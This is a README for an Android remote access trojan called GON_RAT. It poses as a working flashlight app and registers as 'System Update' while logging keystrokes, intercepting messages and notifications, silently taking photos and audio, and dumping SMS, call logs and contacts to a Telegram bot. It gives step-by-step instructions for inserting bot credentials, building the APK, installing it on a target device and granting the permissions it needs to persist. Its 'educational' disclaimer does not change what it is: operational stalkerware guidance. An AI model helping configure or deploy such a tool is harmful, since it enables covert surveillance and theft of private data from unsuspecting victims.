# System Security Monitor (GON_RAT)

A sophisticated Android monitoring and administration tool designed for authorized security testing and research. This application uses a functional "Torch" app as a decoy while executing advanced monitoring tasks in the background.

## 🚀 Key Features

*   **24/7 Persistence**: Utilizes Foreground Services, WakeLocks, and Battery Optimization bypass to remain active indefinitely.
*   **Remote Control**: Fully integrated with Telegram Bot API for real-time remote commands and data delivery.
*   **Advanced Keylogger**: 
    *   Continuous local logging to `keystrokes.txt` (offline support).
    *   Automatic background upload to Telegram when log size reaches threshold.
    *   On-demand retrieval using the `/alllog` command.
*   **Notification Interception**: Captures incoming notifications from all third-party applications (WhatsApp, SMS, etc.) and forwards them to the bot.
*   **Media Surveillance**: Remote camera snapshots (front/back), audio recording, and automated gallery observation.
*   **Data Extraction**: Remote dumping of Call Logs, Contacts, and SMS messages.
*   **Process Isolation**: Core monitoring services run in an independent `:remote` process for maximum stability.

## 🛠️ Remote Commands

| Command | Description |
| --- | --- |
| `/ping` | Check if the system is online. |
| `/status` | Get device hardware info, root status, and time. |
| `/alllog` | Retrieve the complete local keystroke history and clear the file. |
| `/screenshot <value>` | Capture a real-time screenshot of the device. |
| `/camera_front` | Take a silent snapshot using the front camera. |
| `/camera_back` | Take a silent snapshot using the back camera. |
| `/record <sec>` | Record ambient audio for a specified duration. |
| `/dump_sms` `/dump_call` `dump_contacts`| Export all SMS , Call logs , Contacts from the device. |

## ⚙️ Setup Instructions (MT MANAGER)

# Open in MT Manager  :-

◦ Locate the APK, tap it, and Select View.

◦ Tap on **classes.dex** and select Dex Editor Plus. **(📌 select all Dex files)**

◦ Search and Replace:

◦ Tap Search and search for the text: YOUR_BOT_TOKEN_HERE. [obtained from @BotFather]

◦ Replace it with your Bot Token inside the quotes.


Now, search for : YOUR_CHAT_ID_HERE
◦ Replace it with your real Chat ID inside the quotes. [obtained from @userinfobot]

◦ Exit the editor and click OK and install the APK.

◦ MT Manager will ask to Sign the APK. Ensure "Auto-sign" is checked and click OK.

**Crucial**: Grant the following manual permissions for full functionality:

   *   **Accessibility Service**: Enable "System Update" service.
    
   *   **Notification Access**: Enable for "System Update".

   *   **Battery Optimization**: Allow the app to run without restrictions.


⚠️ Common Mistakes to Avoid:

-> Do not remove the quotes (" "): If you delete the quotes, the Smali compiler will crash (this was the "mismatched input" error you had before).

-> Case Sensitivity: Ensure the Bot Token is exactly as @BotFather gave it to you.


## ⚙️ Setup Instructions (ANDROID STUDIO)

1.  **Configure Credentials**:
    *   Open `app/src/main/java/com/pentest/torch/Config.kt`.
    *   Enter your `BOT_TOKEN` and `CHAT_ID` obtained from @BotFather.

2.  **Build**:
    *   Compile the project using Android Studio or Gradle: `./gradlew assembleDebug`.

3.  **Deployment**:
    *   Install the APK on the target device.
    *   **Crucial**: Grant the following manual permissions for full functionality:
        *   **Accessibility Service**: Enable "System Update" service.
        *   **Notification Access**: Enable for "System Update".
        *   **Battery Optimization**: Allow the app to run without restrictions.

## ⚖️ Disclaimer

This project is created for **educational and authorized security testing purposes only**. The developer assumes no liability and is not responsible for any misuse or damage caused by this program. Use of these tools without explicit permission from the device owner is illegal.

---
*Built for research and transparency in Android security.*
